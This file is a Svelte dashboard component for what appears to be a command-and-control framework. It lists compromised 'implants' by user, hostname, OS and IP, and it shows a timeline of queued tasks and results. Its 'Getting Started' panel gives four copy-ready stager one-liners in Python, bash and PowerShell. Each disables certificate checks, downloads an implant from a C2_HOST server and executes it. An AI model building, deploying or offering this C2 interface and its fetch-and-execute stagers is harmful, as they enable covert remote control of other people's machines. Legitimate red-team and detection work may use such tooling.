<script>
  import { onMount } from 'svelte';

  let { implants = [], onSelectImplant = () => {} } = $props();

  let auditEntries = $state([]);
  let loadingAudit = $state(true);

  const online  = $derived(implants.filter(i => i.status === 'online').length);
  const idle    = $derived(implants.filter(i => i.status === 'idle').length);
  const offline = $derived(implants.filter(i => i.status === 'offline').length);

  onMount(async () => {
    try {
      const res = await fetch('/api/audit');
      auditEntries = (await res.json()).slice(0, 12);
    } catch { auditEntries = []; }
    finally  { loadingAudit = false; }
  });

  function timeSince(iso) {
    if (!iso) return 'never';
    const diff = Date.now() - new Date(iso).getTime();
    const s = Math.floor(diff / 1000);
    if (s < 60)    return `${s}s ago`;
    if (s < 3600)  return `${Math.floor(s/60)}m ago`;
    if (s < 86400) return `${Math.floor(s/3600)}h ago`;
    return `${Math.floor(s/86400)}d ago`;
  }

  function platformIcon(os) {
    if (!os) return '◉';
    const o = os.toLowerCase();
    if (o.includes('windows')) return '🪟';
    if (o.includes('darwin') || o.includes('mac')) return '🍎';
    return '🐧';
  }

  const actionBadge = {
    implant_registered: 'badge-accent',
    task_queued:        'badge-primary',
    result_received:    'badge-success',
    task_cancelled:     'badge-warning',
  };

  let copiedIdx = $state(-1);
  async function copyCmd(text, idx) {
    try {
      await navigator.clipboard.writeText(text);
      copiedIdx = idx;
      setTimeout(() => { copiedIdx = -1; }, 1800);
    } catch {}
  }
</script>

<div class="p-6 h-full overflow-y-auto space-y-6">

  <!-- Stat cards -->
  <div class="grid grid-cols-2 lg:grid-cols-4 gap-3">
    {#each [
      { label: 'Total',   value: implants.length, accent: '#00e5b0', icon: '◈',  isOnline: false },
      { label: 'Online',  value: online,           accent: '#3fb950', icon: '●',  isOnline: true  },
      { label: 'Idle',    value: idle,             accent: '#d29922', icon: '◐',  isOnline: false },
      { label: 'Offline', value: offline,          accent: '#f85149', icon: '○',  isOnline: false },
    ] as card}
      <div class="relative rounded-xl bg-base-200 border border-base-300 px-4 py-3 transition-all duration-200
                  hover:border-opacity-80 overflow-hidden"
           style="border-left: 3px solid {card.accent};
                  {card.isOnline && online > 0
                    ? `box-shadow: 0 0 18px rgba(63,185,80,0.12), inset 0 0 24px rgba(63,185,80,0.04)`
                    : ''}">
        {#if card.isOnline && online > 0}
          <!-- Pulse ring on Online card -->
          <span class="absolute inset-0 rounded-xl pointer-events-none animate-pulse"
                style="box-shadow: inset 0 0 0 1.5px rgba(63,185,80,0.25)"></span>
        {/if}
        <div class="text-xs text-base-content/40 uppercase tracking-wider mb-1">{card.label}</div>
        <div class="text-3xl font-mono font-bold" style="color: {card.accent}">{card.value}</div>
      </div>
    {/each}
  </div>

  <!-- Two columns: implant overview + recent events -->
  <div class="grid grid-cols-1 lg:grid-cols-2 gap-4">

    <!-- Implant overview table -->
    <div class="card bg-base-200 border border-base-300">
      <div class="card-body p-4">
        <div class="flex items-center gap-2 mb-3">
          <span class="text-xs text-base-content/40 uppercase tracking-[0.15em] font-semibold">Implants</span>
          <div class="flex-1 h-px bg-base-300"></div>
        </div>
        {#if implants.length === 0}
          <p class="text-sm text-base-content/30 py-4 text-center">Waiting for check-in…</p>
        {:else}
          <div class="overflow-x-auto">
            <table class="table table-xs w-full">
              <thead>
                <tr class="text-base-content/40">
                  <th>Status</th>
                  <th>Identity</th>
                  <th>OS</th>
                  <th>IP</th>
                  <th>Last seen</th>
                </tr>
              </thead>
              <tbody>
                {#each implants as i (i.id)}
                  {@const s = i.status ?? 'offline'}
                  <tr class="cursor-pointer transition-all duration-100 hover:bg-base-300/40"
                      style="hover:box-shadow: inset 0 0 0 1px rgba(0,229,176,0.1)"
                      onclick={() => onSelectImplant(i)}>
                    <td>
                      <div class="flex items-center gap-2">
                        <span class="inline-block w-2.5 h-2.5 rounded-full shrink-0
                          {s==='online'?'bg-success animate-pulse':s==='idle'?'bg-warning':'bg-error'}"
                          style="{s==='online'?'box-shadow:0 0 6px #3fb950':''}"></span>
                        <span class="text-lg leading-none">{platformIcon(i.os)}</span>
                      </div>
                    </td>
                    <td class="font-mono text-xs font-semibold">{i.user}@{i.hostname}</td>
                    <td class="text-xs text-base-content/50 max-w-[120px] truncate">{i.os}</td>
                    <td class="text-xs font-mono text-base-content/40">{i.ip ?? '—'}</td>
                    <td class="text-xs text-base-content/40">{timeSince(i.last_seen)}</td>
                  </tr>
                {/each}
              </tbody>
            </table>
          </div>
        {/if}
      </div>
    </div>

    <!-- Recent audit events -->
    <div class="card bg-base-200 border border-base-300">
      <div class="card-body p-4">
        <div class="flex items-center gap-2 mb-3">
          <span class="text-xs text-base-content/40 uppercase tracking-[0.15em] font-semibold">Recent Activity</span>
          <div class="flex-1 h-px bg-base-300"></div>
        </div>
        {#if loadingAudit}
          <div class="flex justify-center py-6">
            <span class="loading loading-spinner loading-sm"></span>
          </div>
        {:else if auditEntries.length === 0}
          <p class="text-sm text-base-content/30 py-4 text-center">No activity yet.</p>
        {:else}
          <!-- Timeline -->
          <div class="relative pl-5 text-xs space-y-0">
            <!-- Vertical line -->
            <div class="absolute left-2 top-0 bottom-0 w-px bg-base-300"></div>
            {#each auditEntries as e (e.timestamp + e.action)}
              {@const aColor = { implant_registered: '#f97316', task_queued: '#00e5b0', result_received: '#3fb950', task_cancelled: '#d29922' }[e.action] ?? '#c9d1d9'}
              <div class="relative flex items-start gap-2 py-1.5">
                <!-- Circle dot on the timeline line -->
                <span class="absolute -left-[13px] top-[9px] w-2 h-2 rounded-full shrink-0 border-2 border-base-200"
                      style="background:{aColor}; box-shadow: 0 0 6px {aColor}44"></span>
                <div class="flex-1 min-w-0">
                  <span class="font-semibold text-base-content/70 capitalize">
                    {e.action.replace(/_/g,' ')}
                  </span>
                  {#if e.implant_id}
                    <code class="ml-1.5 px-1 py-0.5 rounded text-xs font-mono bg-base-300 text-base-content/45">
                      {e.implant_id.slice(0,8)}
                    </code>
                  {/if}
                </div>
                <span class="text-base-content/25 shrink-0 font-mono text-xs">{timeSince(e.timestamp)}</span>
              </div>
            {/each}
          </div>
        {/if}
      </div>
    </div>

  </div>

  <!-- Getting started (shown when no implants) -->
  {#if implants.length === 0}
    <div class="card bg-base-200 border border-primary/20">
      <div class="card-body p-6">
        <h2 class="card-title text-primary text-sm mb-3">Getting Started</h2>

        <ol class="list-decimal list-inside space-y-2 text-sm text-base-content/60 mb-4">
          <li>Start the C2 server: <code class="kbd kbd-xs">python3 c2_beacon.py</code></li>
          <li>Deploy an implant using one of the stagers below.</li>
          <li>Implants appear here when they check in.</li>
        </ol>

        <!-- Stager commands -->
        <div class="space-y-2 mt-2">
          <p class="text-xs text-base-content/40 uppercase tracking-widest font-semibold mb-2">Quick Deploy Stagers</p>

          {#each [
            { label: 'Python (Linux/Mac)', idx: 0,
              cmd: `python3 -c "import urllib.request,ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; exec(urllib.request.urlopen('https://C2_HOST:9444/api/stage/implant',context=ctx).read())"` },
            { label: 'Bash (curl + python)', idx: 1,
              cmd: `curl -sk https://C2_HOST:9444/api/stage/implant | python3` },
            { label: 'PowerShell (Windows)', idx: 2,
              cmd: `[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadString('https://C2_HOST:9444/api/stage/implant')|python3` },
            { label: 'Python (Windows)', idx: 3,
              cmd: `python -c "import urllib.request,ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; exec(urllib.request.urlopen('https://C2_HOST:9444/api/stage/implant',context=ctx).read())"` },
          ] as stager}
            <div class="rounded-lg bg-base-300 border border-base-content/10 p-2.5">
              <div class="flex items-center justify-between mb-1.5">
                <span class="text-xs text-base-content/40 font-semibold">{stager.label}</span>
                <button
                  class="btn btn-xs btn-ghost text-xs {copiedIdx === stager.idx ? 'text-success' : 'text-base-content/40'}"
                  onclick={() => copyCmd(stager.cmd, stager.idx)}>
                  {copiedIdx === stager.idx ? '✓ Copied' : 'Copy'}
                </button>
              </div>
              <code class="text-xs font-mono text-primary/80 break-all">{stager.cmd}</code>
            </div>
          {/each}

          <p class="text-xs text-base-content/25 mt-2">
            Replace <code class="text-primary/60">C2_HOST</code> with your C2 server IP/hostname.
          </p>
        </div>
      </div>
    </div>
  {/if}

</div>
